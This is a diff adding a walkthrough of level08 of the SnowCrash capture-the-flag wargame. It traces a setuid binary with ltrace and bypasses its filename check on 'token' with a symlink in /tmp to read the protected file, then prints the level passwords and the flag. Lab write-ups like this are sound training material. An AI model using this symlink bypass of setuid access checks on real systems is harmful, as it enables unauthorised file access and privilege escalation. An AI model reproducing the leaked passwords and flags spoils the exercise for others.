@@ -1,0 +1,75 @@
+Level08 - snow_crash
+
+Connect with the previous password "fiumuikeil55xe9cu4dood66h"
+
+	ssh -p 4242 level08@192.168.1.20 
+
+We cannot open the token and not launch it with the level08 program
+Going to need to see what the level08 program do, ltrace it. 
+
+	level08@SnowCrash:~$ ltrace ./level08 token
+
+	__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
+	strstr("token", "token")                                                           = "token"
+	printf("You may not access '%s'\n", "token"You may not access 'token'
+	)                                       = 27
+	exit(1 <unfinished ...>
+	+++ exited (status 1) +++
+
+	--------------------------------------------------------------------------------------------------
+
+	level08@SnowCrash:~$ ltrace ./level08 .bashrc
+
+	__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
+	strstr(".bashrc", "token")                                                         = NULL
+	open(".bashrc", 0, 014435162522)                                                   = 3
+	read(3, "# ~/.bashrc: executed by bash(1)"..., 1024)                               = 1024
+	write(1, "# ~/.bashrc: executed by bash(1)"..., 1024# ~/.bashrc: executed by bash(1) for non-login shells.
+	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+	# for examples
+
+	# If not running interactively, don't do anything
+	[ -z "$PS1" ] && return
+
+	# don't put duplicate lines or lines starting with space in the history.
+	# See bash(1) for more options
+	HISTCONTROL=ignoreboth
+
+	# append to the history file, don't overwrite it
+	shopt -s histappend
+
+	# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+	HISTSIZE=1000
+	HISTFILESIZE=2000
+
+	# check the window size after each command and, if necessary,
+	# update the values of LINES and COLUMNS.
+	shopt -s checkwinsize
+
+	# If set, the pattern "**" used in a pathname expansion context will
+	# match all files and zero or more directories and subdirectories.
+	#shopt -s globstar
+
+	# make less more friendly for non-text input files, see lesspipe(1)
+	[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+	# set variable identifying the chroot you work in (used in the prompt below)
+	if [ -z "$de)                              = 1024
+	+++ exited (status 0) +++
+
+
+
+We see that we can look into the .bashrc file but not the token file.
+The program check at the start the argument that we pass it, it don't allow argument with token as name. 
+
+
+
+We going to create a semilink to the token file. 
+
+	ln -s ~/token /tmp/test/test
+	./level08 /tmp/test/test
+	quif5eloekouj29ke0vouxean
+	su flag08 
+	getflag 
+	
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
